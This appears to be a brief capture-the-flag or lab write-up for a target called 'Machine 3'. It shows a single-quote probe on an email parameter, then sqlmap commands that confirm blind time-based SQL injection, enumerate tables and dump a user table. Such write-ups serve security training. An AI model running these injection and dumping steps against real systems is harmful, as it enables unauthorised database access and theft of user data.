# Machine 3



I forgot we got given creds so I guess I took the hard way into the site :)

get a database error with ```'``` in the email parameter

![](https://i.imgur.com/AC1HAHI.png)

put request in a file and unleash max sqlmap on it

![](https://i.imgur.com/FB7GJXv.png)

```sqlmap -r koala.req --threads=10 --level 5 --risk 3```
![](https://i.imgur.com/AHBIdEl.png)

We have a vulnerability in email param, blind time-based injection

enum tables

```sqlmap -r koala.req --threads=10 --level 5 --risk 3 --tables```

![](https://i.imgur.com/oGITJll.png)

dump user table

```sqlmap -r koala.req --threads=10 --level 5 --risk 3 -T user --dump```

![](https://i.imgur.com/lPJP7uK.png)

